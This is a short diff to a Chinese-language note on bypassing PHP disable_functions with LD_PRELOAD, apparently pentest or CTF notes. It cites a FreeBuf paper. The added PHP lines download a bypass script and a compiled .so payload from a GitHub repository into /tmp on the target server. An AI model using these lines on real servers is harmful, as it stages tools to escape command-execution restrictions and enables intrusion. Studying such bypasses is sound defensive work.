@@ -92,3 +92,8 @@ bypass_disablefunc_x64.so 为执行命令的共享对象，用命令 `gcc -share
 
 papers：[《无需 sendmail：巧用 LD_PRELOAD 突破 disable_functions》](https://www.freebuf.com/web/192052.html  "《无需 sendmail：巧用 LD_PRELOAD 突破 disable_functions》")
 
+```php =
+file_put_contents("/tmp/304c16b91aef1f3bdde94bce72067be0/1.php",(file_get_contents("https://raw.githubusercontent.com/yyff20000/bypass_disablefunc_via_LD_PRELOAD/master/bypass_disablefunc.php")));
+file_put_contents("/tmp/304c16b91aef1f3bdde94bce72067be0/1.so",(file_get_contents("https://raw.githubusercontent.com/yyff20000/bypass_disablefunc_via_LD_PRELOAD/master/bypass_disablefunc_x64.so")));
+
+```
